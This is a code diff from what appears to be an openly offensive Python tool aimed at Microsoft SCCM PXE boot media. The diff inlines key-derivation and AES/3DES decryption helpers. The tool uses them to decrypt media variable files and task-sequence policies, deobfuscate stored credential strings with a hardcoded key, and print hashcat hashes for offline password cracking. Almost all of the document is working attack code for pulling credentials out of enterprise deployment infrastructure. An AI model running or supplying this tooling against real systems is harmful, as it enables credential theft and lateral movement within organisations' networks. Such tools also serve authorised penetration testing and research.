@@ -47,8 +47,9 @@ import ipaddress
 import socket
 import platform
 import configparser
-import media_variable_file_cryptography as media_crypto
 import math
+from Crypto.Cipher import AES, DES3
+from hashlib import sha1
 import lxml.etree as ET
 import requests
 from requests_toolbelt import MultipartEncoder,MultipartDecoder
@@ -90,6 +91,49 @@ def data(label, value):
 
 def cred(label, value):
     console.print(f"    [bold yellow]{label}:[/] [bold red]{value}[/]")
+
+# Media variable file cryptography helpers
+
+def read_media_variable_file(filename):
+    with open(filename, 'rb') as media_file:
+        media_file.seek(24)
+        media_data = media_file.read()
+    return media_data[:-8]
+
+def read_media_variable_file_header(filename):
+    with open(filename, 'rb') as media_file:
+        media_data = media_file.read(40)
+    return media_data
+
+def aes_des_key_derivation(password):
+    key_sha1 = sha1(password).digest()
+    b0 = b""
+    for x in key_sha1:
+        b0 += bytes((x ^ 0x36,))
+    b1 = b""
+    for x in key_sha1:
+        b1 += bytes((x ^ 0x5c,))
+    b0 += b"\x36" * (64 - len(b0))
+    b1 += b"\x5c" * (64 - len(b1))
+    return sha1(b0).digest() + sha1(b1).digest()
+
+def aes128_decrypt(data, key):
+    return AES.new(key, AES.MODE_CBC, b"\x00" * 16).decrypt(data).decode("utf-16-le")
+
+def aes128_decrypt_raw(data, key):
+    return AES.new(key, AES.MODE_CBC, b"\x00" * 16).decrypt(data)
+
+def aes256_decrypt(data, key):
+    return AES.new(key, AES.MODE_CBC, b"\x00" * 16).decrypt(data).decode("utf-16-le")
+
+def aes256_decrypt_raw(data, key):
+    return AES.new(key, AES.MODE_CBC, b"\x00" * 16).decrypt(data)
+
+def _3des_decrypt(data, key):
+    return DES3.new(key, DES3.MODE_CBC, b"\x00" * 8).decrypt(data).decode("utf-16-le")
+
+def _3des_decrypt_raw(data, key):
+    return DES3.new(key, DES3.MODE_CBC, b"\x00" * 8).decrypt(data)
 
 #Scapy global variables
 osName = platform.system()
@@ -524,7 +568,7 @@ def get_pxe_files(ip):
 
     # Print hashcat hash
     try:
-        hashcat_hash = "$sccm$aes128$" + media_crypto.read_media_variable_file_header(var_file_name).hex()
+        hashcat_hash = "$sccm$aes128$" + read_media_variable_file_header(var_file_name).hex()
         found(f"Hashcat hash: [bold]{hashcat_hash}[/]")
     except Exception as e:
         warning(f"Could not compute hashcat hash: {e}")
@@ -569,12 +613,12 @@ def deobfuscate_credential_string(credential_string):
     encrypted_data = binascii.unhexlify(credential_string[128:])
     if len(encrypted_data) == 0:
         raise ValueError("Encrypted data portion is empty")
-    key = media_crypto.aes_des_key_derivation(key_data)
+    key = aes_des_key_derivation(key_data)
     last_16 = math.floor(len(encrypted_data)/8)*8
     try:
-        result = media_crypto._3des_decrypt(encrypted_data[:last_16], key[:24])
+        result = _3des_decrypt(encrypted_data[:last_16], key[:24])
     except UnicodeDecodeError:
-        raw = media_crypto._3des_decrypt_raw(encrypted_data[:last_16], key[:24])
+        raw = _3des_decrypt_raw(encrypted_data[:last_16], key[:24])
         result = safe_decode_utf16le(raw, "deobfuscated credential")
     return result
 
@@ -587,17 +631,17 @@ def decrypt_media_file(path, password, silent=False):
         else:
             info(f"Password bytes: [bold]0x{password.hex()}[/]")
 
-    encrypted_file = media_crypto.read_media_variable_file(path)
+    encrypted_file = read_media_variable_file(path)
     try:
         if password_is_string:
-            key = media_crypto.aes_des_key_derivation(password.encode("utf-16-le"))
+            key = aes_des_key_derivation(password.encode("utf-16-le"))
         else:
-            key = media_crypto.aes_des_key_derivation(password)
+            key = aes_des_key_derivation(password)
         last_16 = math.floor(len(encrypted_file)/16)*16
         try:
-            decrypted_media_file = media_crypto.aes128_decrypt(encrypted_file[:last_16], key[:16])
+            decrypted_media_file = aes128_decrypt(encrypted_file[:last_16], key[:16])
         except UnicodeDecodeError:
-            decrypted_media_file = media_crypto.aes256_decrypt(encrypted_file[:last_16], key[:32])
+            decrypted_media_file = aes256_decrypt(encrypted_file[:last_16], key[:32])
         decrypted_media_file = decrypted_media_file[:decrypted_media_file.rfind('\x00')]
         wf_decrypted_ts = "".join(c for c in decrypted_media_file if c.isprintable())
         if not silent:
@@ -646,16 +690,16 @@ def process_pxe_bootable_and_prestaged_media(media_xml):
     download_and_decrypt_policies_using_certificate(smsMediaGuid, smsTSMediaPFX)
 
 def process_full_media(password, policy):
-    encrypted_policy = media_crypto.read_media_variable_file(policy)
+    encrypted_policy = read_media_variable_file(policy)
 
     try:
         info(f"Password for policy decryption: [bold]{password}[/]")
-        key = media_crypto.aes_des_key_derivation(password.encode("utf-16-le"))
+        key = aes_des_key_derivation(password.encode("utf-16-le"))
         last_16 = math.floor(len(encrypted_policy)/16)*16
         try:
-            decrypted_ts = media_crypto.aes128_decrypt(encrypted_policy[:last_16], key[:16])
+            decrypted_ts = aes128_decrypt(encrypted_policy[:last_16], key[:16])
         except UnicodeDecodeError:
-            decrypted_ts = media_crypto.aes256_decrypt(encrypted_policy[:last_16], key[:32])
+            decrypted_ts = aes256_decrypt(encrypted_policy[:last_16], key[:32])
         decrypted_ts = decrypted_ts[:decrypted_ts.rfind('\x00')]
         wf_decrypted_ts = "".join(c for c in decrypted_ts if c.isprintable())
         success(f"Successfully decrypted policy [bold]{policy}[/]!")
@@ -672,8 +716,8 @@ def use_encrypted_key(encrypted_key, media_file_path):
     encrypted_bytes = encrypted_bytes[20:-12]
     key_data = b'\x9F\x67\x9C\x9B\x37\x3A\x1F\x48\x82\x4F\x37\x87\x33\xDE\x24\xE9'
 
-    key = media_crypto.aes_des_key_derivation(key_data)
-    var_file_key = (media_crypto.aes128_decrypt_raw(encrypted_bytes[:16], key[:16])[:10])
+    key = aes_des_key_derivation(key_data)
+    var_file_key = (aes128_decrypt_raw(encrypted_bytes[:16], key[:16])[:10])
 
     LEADING_BIT_MASK = b'\x80'
     new_key = bytearray()
@@ -1162,7 +1206,7 @@ if __name__ == "__main__":
 
     elif int(sys.argv[1]) == 5:
         console.print(BANNER)
-        header = media_crypto.read_media_variable_file_header(sys.argv[2]).hex()
+        header = read_media_variable_file_header(sys.argv[2]).hex()
         found(f"Hashcat hash (AES-128): [bold]$sccm$aes128${header}[/]")
         found(f"Hashcat hash (AES-256): [bold]$sccm$aes256${header}[/]")
 
